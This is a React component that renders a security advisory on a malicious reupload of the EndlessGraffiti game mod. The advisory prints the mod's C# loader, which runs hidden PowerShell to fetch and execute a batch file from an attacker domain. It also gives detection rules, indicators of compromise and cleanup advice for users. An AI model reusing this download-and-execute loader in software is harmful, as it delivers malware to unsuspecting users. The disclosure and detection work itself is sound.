export default function EndlessGraffitiMalwareAnalysisContent() {
  return (
    <>
      <div className="bg-red-500/10 border-2 border-red-500/50 rounded-lg p-6 mb-6">
        <p className="text-xl font-bold text-red-200 mb-3">⚠️ IMPORTANT DISCLAIMER</p>
        <p className="text-gray-200 mb-4">
          This advisory analyzes a malicious <strong>reupload</strong> of a legitimate mod. The original <strong>EndlessGraffiti</strong> mod and its author are legitimate and safe.
        </p>
        <p className="text-gray-200">
          A malicious actor downloaded/stole the original mod, injected malware into it, and reuploaded it to Nexus Mods under the same or similar name. If you are using the authentic original version from the legitimate author, you are safe. <strong>Only this specific malicious reupload is dangerous.</strong>
        </p>
      </div>

      <p className="text-lg text-gray-300 mb-6">
        On January 11, 2026, this malicious reupload was briefly uploaded to Nexus Mods. The mod was disguised as a graffiti utility but contained malicious code designed to download and execute a payload from an external server. The mod was taken down within the first hour of being posted, with fewer than 10 downloads, several of which were security researchers from the Schedule 1 modding Discord who immediately reported it.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="malicious-behavior" className="text-2xl font-bold text-white mb-4">Malicious Behavior</h2>
      
      <p className="text-gray-300 mb-4">
        Upon initialization, the mod executes PowerShell to download and run a malicious batch file:
      </p>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`// OnInitializeMelon() - Executes on mod load
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "powershell.exe";
psi.Arguments = "-ep bypass -c \\"iwr 'https://fingercakes4sale.store/QcBte' 
    -out $env:TEMP\\dl.bat -useb; 
    if (Test-Path $env:TEMP\\dl.bat) { 
        Start-Process -NoNewWindow $env:TEMP\\dl.bat; 
        Start-Sleep -Seconds 120; 
        Remove-Item $env:TEMP\\dl.bat -Force 
    }\\"";
psi.WorkingDirectory = Path.GetTempPath();
psi.UseShellExecute = true;
psi.WindowStyle = ProcessWindowStyle.Hidden;
Process.Start(psi); // Executes payload`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">What This Does</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Bypasses Execution Policy:</strong> Uses <code>-ep bypass</code> to disable PowerShell security</li>
        <li><strong>Downloads Payload:</strong> Fetches <code>QcBte</code> from <code>fingercakes4sale.store</code></li>
        <li><strong>Saves to Temp:</strong> Writes batch file to <code>%TEMP%\dl.bat</code></li>
        <li><strong>Executes Silently:</strong> Runs with hidden window using <code>-NoNewWindow</code></li>
        <li><strong>Covers Tracks:</strong> Waits 2 minutes then deletes the batch file</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="detection" className="text-2xl font-bold text-white mb-4">MLVScan Detection</h2>
      
      <p className="text-gray-300 mb-4">
        MLVScan detected this threat through multiple detection vectors:
      </p>

      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Process.Start with PowerShell:</strong> Critical severity - executes system shell</li>
        <li><strong>External URL:</strong> Network request to unknown domain (fingercakes4sale.store)</li>
        <li><strong>Hidden Window:</strong> WindowStyle.Hidden indicates evasion attempt</li>
        <li><strong>Temp Directory Usage:</strong> Working directory set to temp path</li>
        <li><strong>Exception Handling:</strong> Try-catch block suppresses errors (stealth technique)</li>
      </ul>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`[Critical] Detected Process.Start call which could execute arbitrary programs.
  Rule: ProcessStartRule
  
[High] Detected network call to external domain: fingercakes4sale.store
  Rule: NetworkCallRule
  
[High] Suspicious use of Path.GetTempPath with process execution
  Rule: SuspiciousPathRule`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">Community Response</h3>
      <p className="text-gray-300 mb-4">
        The Schedule 1 modding Discord community actively monitors the Schedule 1 category on Nexus Mods. When this malware was uploaded, community members immediately analyzed and reported it, leading to its removal within an hour. Beyond reporting to Nexus Mods, the community also reports malicious domains to registrars and hosting providers to further deter attackers. While scan rules are updated when applicable, most malware mods use simple patterns like plain Process.Start that MLVScan already blocks effectively.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="recommendations" className="text-2xl font-bold text-white mb-4">Recommendations</h2>
      
      <h3 className="text-xl font-semibold text-white mb-2">For Users Who Downloaded This Mod</h3>
      <div className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4 mb-6">
        <p className="text-orange-200 font-medium mb-2">⚠️ If you installed this mod before it was taken down:</p>
        <ul className="list-disc pl-6 space-y-1 text-gray-300">
          <li><strong>Immediately uninstall</strong> and delete all mod files</li>
          <li><strong>Run a full antivirus scan</strong> on your system</li>
          <li><strong>Check %TEMP% directory</strong> for any suspicious .bat files</li>
          <li><strong>Change all passwords</strong> (especially Steam, banking, email)</li>
          <li><strong>Monitor network traffic</strong> for connections to fingercakes4sale.store</li>
          <li><strong>Consider wiping and reinstalling Windows</strong> if the mod was executed</li>
        </ul>
      </div>

      <h3 className="text-xl font-semibold text-white mb-2">For All Users</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Always scan mods</strong> with MLVScan before installation</li>
        <li><strong>Check ratings and comments</strong> - this mod had suspiciously few downloads</li>
        <li><strong>Never run games as Administrator</strong> unless absolutely necessary</li>
        <li><strong>Monitor your temp folder</strong> for unexpected batch files</li>
        <li><strong>Report suspicious mods</strong> immediately to Nexus Mods and the community</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="technical-analysis" className="text-2xl font-bold text-white mb-4">Technical Analysis</h2>
      
      <h3 className="text-lg font-semibold text-white mb-3">Indicators of Compromise (IOCs)</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Mod Name:</strong> EndlessGraffiti / MelonLoaderMod37</li>
        <li><strong>File Name:</strong> EndlessGraffiti.dll</li>
        <li><strong>C2 Domain:</strong> fingercakes4sale.store</li>
        <li><strong>Payload URL:</strong> https://fingercakes4sale.store/QcBte</li>
        <li><strong>Temp File:</strong> %TEMP%\dl.bat</li>
        <li><strong>Entry Point:</strong> OnInitializeMelon()</li>
        <li><strong>Assembly Name:</strong> MelonLoaderMod37, Version=1.0.0.0</li>
      </ul>

      <h3 className="text-lg font-semibold text-white mb-3">Evasion Techniques</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Exception Handling:</strong> Try-catch block silently swallows errors</li>
        <li><strong>Hidden Window:</strong> WindowStyle.Hidden prevents user from seeing PowerShell</li>
        <li><strong>Cleanup:</strong> Deletes batch file after execution</li>
        <li><strong>Working Directory:</strong> Uses temp folder to blend in</li>
        <li><strong>Legitimate Appearance:</strong> Mod name suggests harmless feature</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="references" className="text-2xl font-bold text-white mb-4">References</h2>
      <ul className="list-disc pl-6 space-y-2 text-gray-300">
        <li>Nexus Mods Report: Mod removed, user banned</li>
        <li>Analysis Tool: MLVScan with full IL inspection</li>
        <li>Community Report: Schedule 1 Modding Discord</li>
        <li>Sample Hash: [Available upon request to security researchers]</li>
      </ul>
    </>
  )
}
